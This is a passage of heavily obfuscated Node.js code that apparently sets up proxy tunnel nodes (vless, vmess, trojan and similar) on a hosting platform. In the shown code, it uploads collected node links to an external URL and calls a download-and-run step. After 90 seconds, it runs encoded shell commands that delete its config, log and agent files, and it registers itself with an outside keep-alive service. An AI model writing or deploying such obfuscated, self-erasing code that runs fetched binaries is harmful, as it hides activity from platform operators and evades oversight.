_0x2f0d3d=fs[_0x20b8da(0x1fb)](listPath,_0x20b8da(0x1ab)),_0x254267=_0x2f0d3d[_0x20b8da(0x244)]('\x0a')[_0x20b8da(0x187)](_0x22f859=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x20b8da(0x23d)](_0x22f859));if(_0x254267[_0x20b8da(0x188)]===0x0)return;const _0x3d001c=JSON[_0x20b8da(0x238)]({'nodes':_0x254267});try{const _0x32ad7b=await axios['post'](UPLOAD_URL+_0x20b8da(0x1d4),_0x3d001c,{'headers':{'Content-Type':_0x20b8da(0x22b)}});return _0x32ad7b&&_0x32ad7b[_0x20b8da(0x1e2)]===0xc8?(console['log'](_0x20b8da(0x22a)),_0x32ad7b):null;}catch(_0x1cd46b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2d0837=_0x2e32,_0x153817=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x153817['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x153817[_0x2d0837(0x1c7)](phpPath);process['platform']==='win32'?exec(_0x2d0837(0x216)+_0x153817['join']('\x20')+_0x2d0837(0x1b5),_0x43a861=>{const _0x1eb08b=_0x2d0837;console[_0x1eb08b(0x1ed)](),console[_0x1eb08b(0x228)](_0x1eb08b(0x219)),console['log'](_0x1eb08b(0x205));}):exec(_0x2d0837(0x1b2)+_0x153817[_0x2d0837(0x1a1)]('\x20')+_0x2d0837(0x1f5),_0x51edd7=>{const _0x2be0ac=_0x2d0837;console[_0x2be0ac(0x1ed)](),console[_0x2be0ac(0x228)](_0x2be0ac(0x219)),console[_0x2be0ac(0x228)](_0x2be0ac(0x205));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x133872=_0x59258f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x133872(0x228)](_0x133872(0x18a));return;}try{const _0x234780=await axios[_0x133872(0x1c3)](_0x133872(0x1ef),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x133872(0x22b)}});return console[_0x133872(0x228)]('automatic\x20access\x20task\x20added\x20successfully'),_0x234780;}catch(_0x17c444){return console[_0x133872(0x22c)](_0x133872(0x22f)+_0x17c444['message']),null;}}async function startserver(){const _0x3896fb=_0x59258f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5e7f48){console[_0x3896fb(0x22c)](_0x3896fb(0x1a4),_0x5e7f48);}}startserver()['catch'](_0x20b11f=>{const _0xb78b07=_0x59258f;console[_0xb78b07(0x22c)](_0xb78b07(0x24c),_0x20b11f);}),app[_0x59258f(0x1dd)](PORT,()=>console[_0x59258f(0x228)](_0x59258f(0x1e6)+PORT+'!'));
